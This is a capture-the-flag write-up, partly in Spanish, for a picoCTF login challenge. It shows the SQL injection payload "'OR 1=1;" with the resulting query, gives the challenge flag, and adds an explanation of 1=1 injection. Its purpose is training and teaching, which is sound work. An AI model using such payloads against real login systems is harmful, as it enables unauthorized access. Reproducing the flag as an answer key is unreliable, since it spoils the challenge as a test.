## Descripción
There is a website running at https://jupiter.challenges.picoctf.org/problem/39720/ (link) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

## Pistas 
1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.
## Solución
Editamos el archivo HTML, en el input de nombre "debug", quitamos el atributo hidden.

```
username: 'OR 1=1;
password: password
SQL query: SELECT * FROM users WHERE name=''OR 1=1;' AND password='password'
```

## Bandera
picoCTF{s0m3_SQL_c218b685}

## Notas Adicionales
SQL Injection usually occurs when you ask a user for input, like their username/userid, and instead of a name/id, the user gives you an SQL statement that you will unknowingly run on your database.
**SQL Injection Based on 1=1 is Always True**
The original purpose of the code was to create an SQL statement to select a user, with a given user id.
If there is nothing to prevent a user from entering "wrong" input, the user can enter some "smart" input like UserId= 105 OR 1=1

## Referencias
https://www.w3schools.com/sql/sql_injection.asp